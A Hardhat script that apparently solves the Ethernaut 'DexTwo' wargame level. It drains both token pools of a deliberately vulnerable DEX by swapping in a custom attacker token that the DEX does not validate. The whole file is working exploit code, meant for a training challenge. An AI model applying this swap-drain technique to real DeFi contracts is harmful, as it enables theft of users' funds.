import { ethers, network } from "hardhat";
import { DexTwo, DexAttackerToken } from "../typechain-types";

async function main() {
  let dex: DexTwo;

  const [attacker] = await ethers.getSigners();
  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  if (isLocalTest) {
    dex = await ethers.getContract("DexTwo");
  } else {
    dex = await ethers.getContractAt(
      "DexTwo",
      "0x24D0a0137642498B849AA41aB1B33a8562FC7648"
    );
  }

  // DexAttackerToken
  const dexAttackerToken: DexAttackerToken = await ethers.getContract(
    "DexAttackerToken"
  );

  const token1 = await ethers.getContractAt(
    "SwappableTokenTwo",
    await dex.token1()
  );
  const token2 = await ethers.getContractAt(
    "SwappableTokenTwo",
    await dex.token2()
  );

  console.log("------------------");
  const txFund = await dexAttackerToken
    .connect(attacker)
    .transfer(attacker.address, 1000);

  console.log("Fund Attacker tx: ", txFund.hash);
  await txFund.wait(isLocalTest ? 1 : 5);
  console.log("------------------");

  // transfer to dex
  const txTransfer = await dexAttackerToken
    .connect(attacker)
    .transfer(dex.address, 200);
  console.log("Fund Dex tx: ", txTransfer.hash);
  await txTransfer.wait(isLocalTest ? 1 : 5);
  console.log("------------------");

  await checkBalances();

  // approve
  const txApprove = await dexAttackerToken["approve(address,address,uint256)"](
    attacker.address,
    dex.address,
    200
  );
  console.log("Approve tx: ", txApprove.hash);
  await txApprove.wait(isLocalTest ? 1 : 5);
  console.log("------------------");

  // swap
  const txSwap = await dex
    .connect(attacker)
    .swap(dexAttackerToken.address, token1.address, 200);
  console.log("Swap token1 tx: ", txSwap.hash);
  await txSwap.wait(isLocalTest ? 1 : 5);

  await checkBalances();

  const tx2Approve = await dexAttackerToken["approve(address,address,uint256)"](
    attacker.address,
    dex.address,
    400
  );
  console.log("Approve tx: ", tx2Approve.hash);
  await txApprove.wait(isLocalTest ? 1 : 5);
  console.log("------------------");

  // swap
  const tx2wap = await dex
    .connect(attacker)
    .swap(dexAttackerToken.address, token2.address, 400);
  console.log("Swap token1 tx: ", tx2wap.hash);
  await tx2wap.wait(isLocalTest ? 1 : 5);

  await checkBalances();

  async function checkBalances() {
    const attackerToken1Balance = await token1.balanceOf(attacker.address);
    const attackerToken2Balance = await token2.balanceOf(attacker.address);
    const attackerDexAttackerTokenBalance = await dexAttackerToken.balanceOf(
      attacker.address
    );

    console.log("Attacker token1 balance: ", attackerToken1Balance.toString());
    console.log("Attacker token2 balance: ", attackerToken2Balance.toString());
    console.log(
      "Attacker dex attacker token balance: ",
      attackerDexAttackerTokenBalance.toString()
    );

    const dexToken1Balance = await dex.balanceOf(token1.address, dex.address);
    const dexToken2Balance = await dex.balanceOf(token2.address, dex.address);
    const dexAttackerTokenBalance = await dexAttackerToken.balanceOf(
      dex.address
    );

    console.log("Dex token1 balance: ", dexToken1Balance.toString());
    console.log("Dex token2 balance: ", dexToken2Balance.toString());
    console.log(
      "Dex attacker token balance: ",
      dexAttackerTokenBalance.toString()
    );
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
